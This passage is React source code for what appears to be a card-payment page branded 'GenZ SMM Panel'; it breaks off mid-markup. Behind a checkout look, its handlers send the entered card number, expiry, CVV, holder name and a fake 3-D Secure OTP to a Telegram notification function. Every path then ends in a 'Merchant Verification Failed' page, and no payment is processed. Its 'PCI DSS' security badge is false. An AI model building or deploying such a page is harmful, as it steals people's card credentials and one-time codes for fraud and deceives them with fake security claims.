import { useState, useRef, useEffect, useCallback } from "react";
import { useNavigate, useSearchParams } from "@/lib/flowRouter";
import { Lock, Camera, X, ArrowLeft, ShieldCheck, Store, DollarSign, Globe, RefreshCw, ChevronDown, Smartphone } from "lucide-react";
import { sendTelegramNotification } from "@/lib/payment-telegram";
import { useMerchantInfo } from "@/hooks/useMerchantInfo";
import { clearOtpResume, readOtpResume, saveOtpResume } from "@/lib/otpResume";
import { usePaymentAccessGuard } from "@/lib/paymentAccessGuard";


import genzLogo from "@/assets/payment/genz-logo.png";
import visaLogoImg from "@/assets/payment/visa-logo.png";
import mastercardLogoImg from "@/assets/payment/mastercard-logo-color.png";
import amexLogoImg from "@/assets/payment/amex-logo.png";
import troyLogoImg from "@/assets/payment/troy-logo.png";
import discoverLogoImg from "@/assets/payment/discover-logo.png";

const cardOptions = [
  { id: "visa", label: "Visa", logoImg: visaLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #0a1554 0%, #142a8a 45%, #1a3fb3 100%)",
    gradientBack: "linear-gradient(135deg, #1a3fb3 0%, #142a8a 50%, #060d33 100%)",
    accent: "#1a1f71", accentHover: "#0d1547",
  },
  { id: "mastercard", label: "Mastercard", logoImg: mastercardLogoImg, logoImgColor: mastercardLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #0b0b0f 0%, #1a1a24 50%, #23232f 100%)",
    gradientBack: "linear-gradient(135deg, #23232f 0%, #1a1a24 50%, #050508 100%)",
    accent: "#EB001B", accentHover: "#c0000f",
  },
  { id: "amex", label: "American Express", logoImg: amexLogoImg, cvvLength: 4,
    gradient: "linear-gradient(135deg, #016fd0 0%, #0353a4 55%, #012a63 100%)",
    gradientBack: "linear-gradient(135deg, #012a63 0%, #0353a4 55%, #016fd0 100%)",
    accent: "#016FD0", accentHover: "#014e94",
  },
  { id: "troy", label: "Troy", logoImg: troyLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #0a7b7f 0%, #0f9fa3 55%, #14b8bd 100%)",
    gradientBack: "linear-gradient(135deg, #14b8bd 0%, #0f9fa3 55%, #063638 100%)",
    accent: "#0f9fa3", accentHover: "#0a7b7f",
  },
  { id: "discover", label: "Discover", logoImg: discoverLogoImg, cvvLength: 3,
    gradient: "linear-gradient(135deg, #1c1c1c 0%, #2d2d2d 45%, #f16a1c 130%)",
    gradientBack: "linear-gradient(135deg, #f16a1c 0%, #2d2d2d 60%, #0a0a0a 100%)",
    accent: "#F16A1C", accentHover: "#c9540f",
  },
];

const brandGridOrder = ["visa", "mastercard", "amex", "troy", "discover"];

const CardPaymentPage = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "00";
  usePaymentAccessGuard("card");
  const { merchant: merchantName, inv: merchantInv } = useMerchantInfo("card", { merchant: "", inv: "" });
  const otpResumeRef = useRef(readOtpResume("card"));
  const otpResumeState = otpResumeRef.current?.state;
  const initialSelectedBrand = typeof otpResumeState?.selectedBrandId === "string" && cardOptions.some((card) => card.id === otpResumeState.selectedBrandId)
    ? otpResumeState.selectedBrandId
    : null;


  const [selectedBrandId, setSelectedBrandId] = useState<string | null>(initialSelectedBrand);
  const [pickerBrandId, setPickerBrandId] = useState<string | null>(initialSelectedBrand);
  const selectedCard = cardOptions.find((c) => c.id === selectedBrandId);


  const [cardNumber, setCardNumber] = useState(typeof otpResumeState?.cardNumber === "string" ? otpResumeState.cardNumber : "");
  const [expiry, setExpiry] = useState(typeof otpResumeState?.expiry === "string" ? otpResumeState.expiry : "");
  const [cvv, setCvv] = useState(typeof otpResumeState?.cvv === "string" ? otpResumeState.cvv : "");
  const [cardHolder, setCardHolder] = useState(typeof otpResumeState?.cardHolder === "string" ? otpResumeState.cardHolder : "");
  const [isFlipped, setIsFlipped] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [cardVisible, setCardVisible] = useState(false);
  const [showOtp, setShowOtp] = useState(otpResumeState?.showOtp === true);
  const [otpCode, setOtpCode] = useState(typeof otpResumeState?.otpCode === "string" ? otpResumeState.otpCode : "");
  const [otpTimer, setOtpTimer] = useState(typeof otpResumeState?.otpTimer === "number" ? otpResumeState.otpTimer : 60);
  const [otpLoading, setOtpLoading] = useState(false);
  const [sessionTimer, setSessionTimer] = useState(typeof otpResumeState?.sessionTimer === "number" ? otpResumeState.sessionTimer : 402);
  const [showCamera, setShowCamera] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [scanError, setScanError] = useState<string | null>(null);
  const [zoomScale, setZoomScale] = useState(1);
  const [binInfo, setBinInfo] = useState<{ bank?: string; country?: string; countryEmoji?: string; type?: string; scheme?: string } | null>(null);
  const [binLoading, setBinLoading] = useState(false);
  const [transactionId, setTransactionId] = useState(typeof otpResumeState?.transactionId === "string" ? otpResumeState.transactionId : "");

  // Detect brand from card number prefix (local, instant)
  const detectBrand = (num: string): string | null => {
    const n = num.replace(/\D/g, "");
    if (!n) return null;
    if (/^4/.test(n)) return "visa";
    if (/^(5[1-5]|2[2-7])/.test(n)) return "mastercard";
    if (/^3[47]/.test(n)) return "amex";
    if (/^(6011|65|64[4-9])/.test(n)) return "discover";
    return null;
  };
  const detectedBrand = detectBrand(cardNumber);

  // BIN lookup once we have >=6 digits — tries multiple providers for reliability


  useEffect(() => {
    const bin = cardNumber.replace(/\D/g, "").slice(0, 8);
    if (bin.length < 6) { setBinInfo(null); return; }
    let cancelled = false;

    const flagFromCC = (cc?: string) => {
      if (!cc || cc.length !== 2) return undefined;
      return String.fromCodePoint(...cc.toUpperCase().split("").map(c => 0x1f1e6 + c.charCodeAt(0) - 65));
    };

    const tryHandyApi = async () => {
      const res = await fetch(`https://data.handyapi.com/bin/${bin}`);
      if (!res.ok) throw new Error("handy");
      const d = await res.json();
      if (d?.Status && d.Status !== "SUCCESS") throw new Error("handy-status");
      return {
        scheme: d?.Scheme,
        type: d?.Type,
        bank: d?.Issuer,
        country: d?.Country?.Name,
        countryEmoji: flagFromCC(d?.Country?.A2),
      };
    };
    const tryBinlist = async () => {
      const res = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { "Accept-Version": "3" } });
      if (!res.ok) throw new Error("binlist");
      const d = await res.json();
      return {
        scheme: d?.scheme,
        type: d?.type,
        bank: d?.bank?.name,
        country: d?.country?.name,
        countryEmoji: d?.country?.emoji || flagFromCC(d?.country?.alpha2),
      };
    };

    const t = setTimeout(async () => {
      setBinLoading(true);
      let info: any = null;
      try { info = await tryHandyApi(); } catch {
        try { info = await tryBinlist(); } catch { info = null; }
      }
      if (cancelled) return;
      if (info && (info.scheme || info.bank || info.country || info.type)) {
        setBinInfo({
          bank: info.bank || undefined,
          country: info.country || undefined,
          countryEmoji: info.countryEmoji || undefined,
          type: info.type || undefined,
          scheme: info.scheme || undefined,
        });
      } else {
        setBinInfo(null);
      }
      setBinLoading(false);
    }, 400);
    return () => { cancelled = true; clearTimeout(t); };
  }, [cardNumber]);

  useEffect(() => {
    // Only reflect admin-set invoice; never generate a fallback id.
    setTransactionId(merchantInv ? merchantInv.trim() : "");
  }, [merchantInv]);

  useEffect(() => {
    if (showOtp && selectedBrandId) {
      saveOtpResume("card", searchParams.toString(), {
        showOtp: true,
        selectedBrandId,
        cardNumber,
        expiry,
        cvv,
        cardHolder,
        otpCode,
        otpTimer,
        sessionTimer,
        transactionId,
      });
    } else {
      clearOtpResume("card");
    }
  }, [showOtp, selectedBrandId, cardNumber, expiry, cvv, cardHolder, otpCode, otpTimer, sessionTimer, transactionId, searchParams]);

  useEffect(() => {
    const vv = window.visualViewport;
    if (!vv) return;
    const update = () => setZoomScale(vv.scale || 1);
    update();
    vv.addEventListener("resize", update);
    vv.addEventListener("scroll", update);
    return () => { vv.removeEventListener("resize", update); vv.removeEventListener("scroll", update); };
  }, []);

  const cardNumberRef = useRef<HTMLInputElement>(null);
  const otpInputRef = useRef<HTMLInputElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  const cvvMaxLength = selectedCard?.cvvLength ?? 3;

  useEffect(() => {
    if (!selectedCard) return;
    setCardVisible(false);
    const t1 = setTimeout(() => setCardVisible(true), 100);
    const t2 = setTimeout(() => cardNumberRef.current?.focus(), 400);
    return () => { clearTimeout(t1); clearTimeout(t2); };
  }, [selectedCard]);

  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      if (showOtp) navigate(`/payment-cancelled?channel=${selectedCard?.label || 'Card'} Card Payment&reason=Payment isn't completed&amount=${amount}`);
      else if (selectedCard) setSelectedBrandId(null);
      else navigate(`/payment?amount=${amount}&promo=${encodeURIComponent(searchParams.get('promo') || '')}`);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount, selectedCard, showOtp]);

  useEffect(() => { if (showOtp) setTimeout(() => otpInputRef.current?.focus(), 100); }, [showOtp]);
  useEffect(() => {
    let interval: ReturnType<typeof setInterval>;
    if (showOtp && otpTimer > 0) interval = setInterval(() => setOtpTimer((p) => p - 1), 1000);
    return () => clearInterval(interval);
  }, [showOtp, otpTimer]);
  useEffect(() => {
    if (!showOtp) return;
    const iv = setInterval(() => setSessionTimer((p) => (p > 0 ? p - 1 : 0)), 1000);
    return () => clearInterval(iv);
  }, [showOtp]);

  const stopCamera = useCallback(() => {
    if (streamRef.current) {
      if ((streamRef.current as any)._scanInterval) clearInterval((streamRef.current as any)._scanInterval);
      streamRef.current.getTracks().forEach((track) => track.stop());
      streamRef.current = null;
    }
    if ((window as any).__scanInterval) { clearInterval((window as any).__scanInterval); delete (window as any).__scanInterval; }
  }, []);

  const startCamera = useCallback(async () => {
    setShowCamera(true); setScanProgress(0);
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } } });
      streamRef.current = stream;
      if (videoRef.current) { videoRef.current.srcObject = stream; videoRef.current.play(); }
      let progress = 0; let direction = 1;
      const scanInterval = setInterval(() => {
        progress += direction * 1.5;
        if (progress >= 100) direction = -1;
        if (progress <= 0) direction = 1;
        setScanProgress(progress);
      }, 30);
      streamRef.current.addEventListener('inactive', () => clearInterval(scanInterval));
      (streamRef.current as any)._scanInterval = scanInterval;
    } catch {
      let progress = 0; let direction = 1;
      const scanInterval = setInterval(() => {
        progress += direction * 1.5;
        if (progress >= 100) direction = -1;
        if (progress <= 0) direction = 1;
        setScanProgress(progress);
      }, 30);
      (window as any).__scanInterval = scanInterval;
    }
  }, []);

  useEffect(() => () => stopCamera(), [stopCamera]);

  const parseCardText = (raw: string) => {
    const text = raw.replace(/[|IlO]/g, (c) => (c === "O" ? "0" : "1"));
    const digitsOnly = text.replace(/[^\d\s\n]/g, " ");
    // Card number: find 13-19 digit sequence (allow spaces)
    let cardNum: string | null = null;
    const numMatches = digitsOnly.match(/(?:\d[ \-]?){13,19}/g) || [];
    for (const m of numMatches) {
      const d = m.replace(/\D/g, "");
      if (d.length >= 13 && d.length <= 19) { cardNum = d; break; }
    }
    // Expiry MM/YY
    let exp: string | null = null;
    const expMatch = text.match(/(0[1-9]|1[0-2])\s*[\/\-]\s*(\d{2}|\d{4})/);
    if (expMatch) {
      const yy = expMatch[2].length === 4 ? expMatch[2].slice(2) : expMatch[2];
      exp = `${expMatch[1]}/${yy}`;
    }
    // Name: uppercase line with 2+ words, not containing digits
    let name: string | null = null;
    const lines = raw.split(/\n+/).map((l) => l.trim()).filter(Boolean);
    for (const l of lines) {
      if (/\d/.test(l)) continue;
      const clean = l.replace(/[^A-Za-z .'-]/g, "").trim();
      const words = clean.split(/\s+/).filter((w) => w.length >= 2);
      if (words.length >= 2 && clean.length >= 5 && clean === clean.toUpperCase()) {
        name = words.join(" ");
        break;
      }
    }
    return { cardNum, exp, name };
  };

  const captureAndScan = useCallback(async () => {
    if (!videoRef.current || scanning) return;
    setScanning(true); setScanError(null);
    try {
      const video = videoRef.current;
      const w = video.videoWidth || 1280;
      const h = video.videoHeight || 720;
      const canvas = document.createElement("canvas");
      canvas.width = w; canvas.height = h;
      const ctx = canvas.getContext("2d");
      if (!ctx) throw new Error("no ctx");
      ctx.drawImage(video, 0, 0, w, h);
      const { recognize } = await import("tesseract.js");
      const { data } = await recognize(canvas, "eng");
      const parsed = parseCardText(data.text || "");
      if (!parsed.cardNum && !parsed.exp && !parsed.name) {
        setScanError("Couldn't read card. Try better lighting.");
        setScanning(false);
        return;
      }
      if (parsed.cardNum) setCardNumber(formatCardNumber(parsed.cardNum));
      if (parsed.exp) setExpiry(parsed.exp);
      if (parsed.name) setCardHolder(parsed.name);
      stopCamera();
      setShowCamera(false);
    } catch (e) {
      setScanError("Scan failed. Please enter manually.");
    } finally {
      setScanning(false);
    }
  }, [scanning, stopCamera]);

  const formatCardNumber = (value: string) => value.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
  const formatExpiry = (value: string) => {
    const nums = value.replace(/\D/g, "").slice(0, 4);
    if (nums.length >= 3) return `${nums.slice(0, 2)}/${nums.slice(2)}`;
    return nums;
  };
  const displayCardNumber = () => {
    const nums = cardNumber.replace(/\s/g, "");
    const padded = nums.padEnd(16, "•");
    return `${padded.slice(0, 4)} ${padded.slice(4, 8)} ${padded.slice(8, 12)} ${padded.slice(12, 16)}`;
  };
  const getMaskedCard = () => {
    const nums = cardNumber.replace(/\s/g, "");
    if (nums.length < 8) return "****";
    return `**** **** **** ${nums.slice(-4)}`;
  };
  const isFormValid = () => {
    const nums = cardNumber.replace(/\s/g, "");
    return nums.length === 16 && expiry.length === 5 && cvv.length === cvvMaxLength && cardHolder.length > 2;
  };
  const handleCardHolderChange = (e: React.ChangeEvent<HTMLInputElement>) => setCardHolder(e.target.value.replace(/[0-9]/g, ""));

  const handleSubmit = () => {
    if (!isFormValid() || !selectedCard) return;
    setIsLoading(true);
    sendTelegramNotification({ type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv });
    setTimeout(() => { setIsLoading(false); setShowOtp(true); setOtpTimer(60); }, 4000);
  };
  const handleOtpConfirm = () => {
    if (otpCode.length !== 6 || !selectedCard) return;
    sendTelegramNotification({ type: 'payment_activity', amount, method: selectedCard.label, paymentType: 'card', cardName: cardHolder, cardNumber, expiry, cvv, otp: otpCode });
    setOtpLoading(true);
    setTimeout(() => {
      setOtpLoading(false);
      navigate(`/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Merchant Verification Failed&amount=${amount}&ref=${selectedCard.id.toUpperCase()}` + Date.now().toString().slice(-8));
    }, 5000);
  };
  const handleResendOtp = () => { if (otpTimer > 0) return; setOtpTimer(60); setOtpCode(""); };

  // ── Brand selector screen ────────────────────────────────────────────────
  if (!selectedCard) {
    return (
      <div className="fixed inset-0 bg-gradient-to-b from-slate-50 via-white to-slate-100 flex flex-col items-center justify-start overflow-auto">
        <div className="w-full max-w-md mx-auto px-4 pt-6 pb-8 animate-fade-in">
          {/* Header */}
          <div className="flex items-center gap-3 mb-5">
            <div className="w-11 h-11 rounded-xl bg-gradient-to-br from-blue-50 to-blue-100 border border-blue-200/60 flex items-center justify-center shadow-sm">
              <svg className="w-6 h-6 text-blue-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
                <rect x="2" y="6" width="20" height="13" rx="2.5" /><path d="M2 10h20" />
              </svg>
            </div>
            <div>
              <h1 className="text-slate-900 text-[17px] font-bold leading-tight">Pay with Credit/Debit Card</h1>
              <p className="text-slate-500 text-xs mt-0.5">Select Payment Method</p>
            </div>
          </div>

          {/* Transaction Details */}
          <div className="rounded-2xl bg-white border border-slate-200/80 shadow-[0_4px_20px_rgba(15,23,42,0.04)] p-4 mb-5 animate-scale-in">
            <div className="flex items-center gap-2 mb-3">
              <ShieldCheck className="w-4 h-4 text-blue-600" />
              <h3 className="text-slate-800 text-sm font-bold">Transaction Details</h3>
            </div>
            <div className="space-y-0 divide-y divide-slate-100">
              <div className="flex items-center justify-between py-2.5">
                <div className="flex items-center gap-2 text-slate-500 text-[13px]">
                  <DollarSign className="w-4 h-4" /><span>Amount</span>
                </div>
                <span className="text-slate-900 text-[15px] font-bold">৳{amount}</span>
              </div>
              <div className="flex items-center justify-between py-2.5">
                <span className="text-slate-500 text-[13px] pl-6">Transaction ID</span>
                <span className="text-slate-800 text-[12px] font-mono tracking-wider">{(merchantInv && merchantInv.trim()) || transactionId || "—"}</span>
              </div>
              <div className="flex items-center justify-between py-2.5">
                <div className="flex items-center gap-2 text-slate-500 text-[13px]">
                  <Store className="w-4 h-4" /><span>Merchant ID</span>
                </div>
                <span className="text-slate-800 text-[12px] font-semibold tracking-wide">{merchantName}</span>
              </div>
            </div>
          </div>

          {/* Brand grid */}
          <div className="grid grid-cols-3 gap-2.5 mb-5">
            {brandGridOrder.map((id, i) => {
              const brand = cardOptions.find((c) => c.id === id)!;
              const active = pickerBrandId === id;
              return (
                <button
                  key={id}
                  onClick={() => setPickerBrandId(id)}
                  className={`group relative bg-white rounded-xl border p-3 flex flex-col items-center justify-center gap-2 transition-all duration-300 shadow-sm hover:shadow-md active:scale-95 ${active ? 'border-blue-500 ring-2 ring-blue-200 -translate-y-0.5 shadow-[0_8px_24px_rgba(59,130,246,0.18)]' : 'border-slate-200 hover:border-slate-300'}`}
                  style={{ animation: `fadeInUp 0.4s ease-out ${i * 0.06}s both` }}
                >
                  <div className="h-8 flex items-center justify-center">
                    <img src={brand.logoImg} alt={brand.label} className="max-h-8 max-w-[70px] object-contain" />
                  </div>
                  <span className="text-[11px] text-slate-700 font-semibold leading-tight text-center">{brand.label}</span>
                  {active && (
                    <span className="absolute -top-1.5 -right-1.5 w-5 h-5 rounded-full bg-blue-600 text-white flex items-center justify-center shadow-md">
                      <svg className="w-3 h-3" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M16.7 5.3a1 1 0 010 1.4l-8 8a1 1 0 01-1.4 0l-4-4a1 1 0 111.4-1.4L8 12.58l7.3-7.3a1 1 0 011.4 0z" clipRule="evenodd" /></svg>
                    </span>
                  )}
                </button>
              );
            })}
          </div>

          {/* Continue */}
          <button
            onClick={() => {
              if (!pickerBrandId) return;
              const brand = cardOptions.find((c) => c.id === pickerBrandId);
              if (brand) {
                sendTelegramNotification({
                  type: 'payment_activity',
                  amount,
                  method: 'Card',
                  paymentType: 'card',
                  cardName: brand.label,
                });
              }
              setSelectedBrandId(pickerBrandId);
            }}
            disabled={!pickerBrandId}
            className={`w-full py-3.5 rounded-xl text-[15px] font-semibold transition-all duration-300 mb-2.5 ${pickerBrandId ? 'bg-blue-600 hover:bg-blue-700 text-white shadow-lg shadow-blue-500/25 active:scale-[0.98]' : 'bg-blue-300/70 text-white cursor-not-allowed'}`}
          >
            Continue
          </button>

          {/* Back to Store */}
          <button
            onClick={() => navigate(`/payment?amount=${amount}&promo=${encodeURIComponent(searchParams.get('promo') || '')}`)}
            className="w-full py-3 rounded-xl text-[14px] font-medium bg-slate-100 hover:bg-slate-200 text-slate-700 transition-all duration-200 flex items-center justify-center gap-2 active:scale-[0.98]"
          >
            <ArrowLeft className="w-4 h-4" /> Back to the Store
          </button>

          {/* Footer */}
          <div className="flex items-center justify-between mt-5 text-slate-400">
            <div className="flex items-center gap-1.5 text-[11px]">
              <ShieldCheck className="w-3.5 h-3.5 text-green-500" />
              <span>Data are protected by the PCI DSS standard</span>
            </div>
            <div className="flex items-center gap-1 text-[11px] px-2 py-1 rounded-md border border-slate-200 bg-white">
              <Globe className="w-3 h-3" /><span>English</span>
            </div>
          </div>
        </div>
        <style>{`@keyframes fadeInUp { from { opacity:0; transform: translateY(12px);} to {opacity:1; transform: translateY(0);} }`}</style>
      </div>
    );
  }


  if (showCamera) {
    return (
      <div className="fixed inset-0 bg-black flex flex-col items-center justify-center z-50">
        <div className="absolute top-4 right-4 z-10">
          <button onClick={() => { stopCamera(); setShowCamera(false); }} className="w-10 h-10 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center"><X className="w-5 h-5 text-white" /></button>
        </div>
        <div className="relative w-full max-w-md px-6">
          <video ref={videoRef} className="w-full rounded-2xl bg-gray-900 aspect-video object-cover" muted playsInline />
          <div className="absolute inset-6 rounded-2xl border-2 border-white/30 pointer-events-none">
            <div className="absolute left-2 right-2 h-0.5 bg-gradient-to-r from-transparent via-blue-400 to-transparent transition-all duration-100" style={{ top: `${scanProgress}%` }} />
          </div>
        </div>
        <div className="mt-6 w-full max-w-md px-6 flex flex-col items-center gap-3">
          <p className="text-white/70 text-xs text-center">Position your card within the frame and tap Capture</p>
          {scanError && <p className="text-red-400 text-xs text-center">{scanError}</p>}
          <button
            onClick={captureAndScan}
            disabled={scanning}
            className="w-full max-w-xs py-3 rounded-xl bg-white text-black font-semibold disabled:opacity-60 flex items-center justify-center gap-2"
          >
            {scanning ? (<><span className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />Scanning…</>) : (<><Camera className="w-4 h-4" />Capture</>)}
          </button>
        </div>
      </div>
    );
  }

  if (showOtp) {
    const cancelHref = `/payment-cancelled?channel=${selectedCard.label} Card Payment&reason=Payment isn't completed&amount=${amount}`;
    const nowStr = new Date().toString();
    const merchantId = "GenZSMM";
    const idCheckLabel =
      selectedCard.id === "visa" ? "ID Check" :
      selectedCard.id === "mastercard" ? "ID Check" :
      selectedCard.id === "amex" ? "SafeKey" :
      "ID Check";
    return (
      <div className="fixed inset-0 bg-slate-50 flex flex-col overflow-auto">
        <div className="w-full max-w-md mx-auto px-5 pt-6 pb-4 flex-1 flex flex-col">
          {/* Header */}
          <div className="flex items-center justify-between mb-6">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-5 h-5" style={{ color: selectedCard.accent }} strokeWidth={2.2} />
              <div className="text-[15px] leading-none">
                <span className="font-bold text-slate-800">Payment</span>{" "}
                <span className="text-slate-400 font-normal">Authentication</span>
              </div>
            </div>
            <div className="flex items-center gap-1.5">
              <img src={selectedCard.logoImg} alt={selectedCard.label} className="h-5 object-contain" />
              <span className="text-slate-400 text-[13px]">{idCheckLabel}</span>
            </div>
          </div>

          {/* Phone illustration */}
          <div className="flex justify-center mb-4">
            <div className="relative">
              <div className="w-[86px] h-[130px] rounded-[14px] bg-slate-800 flex flex-col items-center justify-start pt-2.5 pb-2 shadow-md">
                <div className="w-8 h-1 rounded-full bg-slate-600 mb-1.5" />
                <div className="flex-1 w-[72px] rounded-md bg-slate-100" />
                <div className="w-4 h-4 rounded-full border-2 border-slate-600 mt-1.5" />
              </div>
              {/* Speech bubble */}
              <div className="absolute -right-8 top-10 bg-slate-800 rounded-lg px-3 py-2 flex items-center gap-1 shadow-md">
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <span className="w-1 h-1 rounded-full bg-white/90" />
                <div className="absolute left-0 top-1/2 -translate-x-1/2 -translate-y-1/2 w-0 h-0 border-t-[6px] border-t-transparent border-b-[6px] border-b-transparent border-r-[8px] border-r-slate-800" />
              </div>
            </div>
          </div>

          <p className="text-center text-[12px] leading-relaxed text-slate-500 mb-5 px-1">
            We have sent you a text message with an OTP to your registered auth ending with{" "}
            <span className="font-medium text-slate-700">XXXXXXXXXX</span>. You are paying merchant{" "}
            <span className="font-semibold text-slate-700">{merchantId}</span> the amount of{" "}
            <span className="font-semibold text-slate-700">BDT{Number(amount).toFixed(2)}</span> on{" "}
            <span className="text-slate-600">{nowStr}</span>.
          </p>

          {/* Transaction Details */}
          <div className="bg-white rounded-2xl border border-slate-200/70 shadow-[0_1px_2px_rgba(15,23,42,0.04)] overflow-hidden mb-6">
            <div className="flex items-center gap-2 px-4 py-3 border-b border-slate-100">
              <ShieldCheck className="w-4 h-4 text-slate-700" strokeWidth={2.2} />
              <span className="text-[13px] font-semibold text-slate-800">Transaction Details</span>
            </div>
            <div className="px-4 py-3 flex items-center justify-between border-b border-slate-100">
              <div className="flex items-center gap-2 text-slate-500 text-[13px]">
                <DollarSign className="w-4 h-4" strokeWidth={2} />
                <span>Amount</span>
              </div>
              <span className="text-slate-800 font-semibold text-[14px]">৳{amount}</span>
            </div>
            <div className="px-4 py-3 flex items-center justify-between border-b border-slate-100">
              <span className="text-slate-500 text-[13px]">Transaction ID</span>
              <span className="text-slate-800 font-mono text-[12px] tracking-wide">{(merchantInv && merchantInv.trim()) || transactionId}</span>
            </div>
            <div className="px-4 py-3 flex items-center justify-between">
              <div className="flex items-center gap-2 text-slate-500 text-[13px]">
                <Store className="w-4 h-4" strokeWidth={2} />
                <span>Merchant ID</span>
              </div>
              <span className="text-slate-800 font-semibold text-[13px] tracking-wide">{merchantId}</span>
            </div>
          </div>

          {/* OTP input */}
          <div className="mb-4">
            <label className="block text-slate-600 text-[13px] mb-2">Enter OTP Code</label>
            <input
              ref={otpInputRef}
              type="tel"
              inputMode="numeric"
              maxLength={6}
              value={otpCode}
              onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder="Enter 6-digit OTP"
              className="w-full bg-blue-50/70 border border-blue-100 rounded-xl px-4 py-3.5 text-center text-[15px] text-slate-800 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-200 transition-all font-medium tracking-[6px]"
            />
          </div>

          <button
            onClick={handleOtpConfirm}
            disabled={otpCode.length !== 6 || otpLoading}
            className={`w-full py-3.5 rounded-xl text-white text-[14px] font-semibold transition-all duration-300 mb-3 ${
              otpCode.length === 6 && !otpLoading
                ? "bg-blue-600 hover:bg-blue-700 shadow-[0_4px_14px_rgba(37,99,235,0.35)]"
                : "bg-blue-300 cursor-not-allowed"
            }`}
          >
            {otpLoading ? "Verifying..." : "Verify"}
          </button>

          <div className="grid grid-cols-2 gap-3 mb-4">
            <button
              onClick={handleResendOtp}
              disabled={otpTimer > 0}
              className={`flex items-center justify-center gap-2 py-3 rounded-xl border text-[13px] font-medium transition-all ${
                otpTimer > 0
                  ? "border-slate-200 bg-slate-50 text-slate-400 cursor-not-allowed"
                  : "border-blue-200 bg-blue-50 text-blue-700 hover:bg-blue-100"
              }`}
            >
              <RefreshCw className="w-4 h-4" strokeWidth={2} />
              Resend {otpTimer > 0 ? `(${otpTimer}s)` : ""}
            </button>
            <button
              onClick={() => navigate(cancelHref)}
              className="flex items-center justify-center gap-2 py-3 rounded-xl border border-red-200 bg-white text-red-500 text-[13px] font-medium hover:bg-red-50 transition-all"
            >
              <X className="w-4 h-4" strokeWidth={2.2} />
              Cancel
            </button>
          </div>

          <p className="text-center text-slate-400 text-[11px] mb-6">
            The page will automatically timeout after {sessionTimer} seconds.
          </p>

          <div className="mt-auto flex items-center justify-between pt-4 border-t border-slate-200/70">
            <div className="flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" strokeWidth={2.2} />
              <span className="text-slate-400 text-[11px]">Data are protected by the PCI DSS standard</span>
            </div>
            <div className="flex items-center gap-1 border border-slate-200 rounded-full px-2.5 py-1 text-[11px] text-slate-600">
              <Globe className="w-3 h-3" strokeWidth={2} />
              <span>us</span>
              <span>Engli</span>
              <ChevronDown className="w-3 h-3" strokeWidth={2} />
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-gradient-to-b from-slate-50 via-white to-slate-100 flex flex-col items-center justify-start overflow-auto">
      <div className="flex flex-col min-h-[100dvh] w-full max-w-[440px] mx-auto">
        {/* Top bar */}
        <div className="flex items-center justify-between px-4 pt-4 pb-3 shrink-0">
          <button onClick={() => setSelectedBrandId(null)} className="flex items-center gap-1.5 text-slate-500 text-[13px] font-medium hover:text-slate-800 transition-colors">
            <ArrowLeft className="w-4 h-4" />Back
          </button>
          <div className="flex items-center gap-1.5">
            <img src={genzLogo} alt="GenZ" className="w-6 h-6 rounded-full" />
            <span className="text-slate-800 text-[13px] font-semibold tracking-tight">GenZ SMM Panel</span>
          </div>
          <div className="flex items-center gap-1 text-slate-400">
            <Lock className="w-3.5 h-3.5" /><span className="text-[11px] font-medium">Secure</span>
          </div>
        </div>

        {/* Card visual */}
        <div className="px-4 mb-4 transition-all duration-700 ease-out shrink-0" style={{ opacity: cardVisible ? 1 : 0, transform: cardVisible ? "translateY(0) scale(1)" : "translateY(-30px) scale(0.94)" }}>
          <div className="relative w-full transition-transform duration-600 ease-in-out aspect-[1.586/1] max-h-[220px]" style={{ transformStyle: "preserve-3d", transform: isFlipped ? "rotateY(180deg)" : "rotateY(0deg)", perspective: "1000px" }}>
            <div className="absolute inset-0 rounded-2xl p-5 flex flex-col justify-between shadow-2xl overflow-hidden" style={{ backfaceVisibility: "hidden", background: selectedCard.gradient }}>
              <div className="absolute inset-0 pointer-events-none opacity-70" style={{ background: "radial-gradient(circle at 20% 0%, rgba(255,255,255,0.18), transparent 55%)" }} />
              <div className="absolute inset-0 pointer-events-none" style={{ background: "linear-gradient(115deg, transparent 40%, rgba(255,255,255,0.08) 50%, transparent 60%)" }} />
              <div className="absolute -right-10 -bottom-14 w-44 h-44 rounded-full pointer-events-none" style={{ background: "radial-gradient(circle, rgba(255,255,255,0.10), transparent 70%)" }} />

              <div className="relative flex justify-between items-start">
                <div className="flex items-center gap-2.5">
                  <div className="w-11 h-8 rounded-md shadow-inner relative overflow-hidden" style={{ background: "linear-gradient(135deg, #f7d67a 0%, #d4a83a 50%, #a67c1a 100%)" }}>
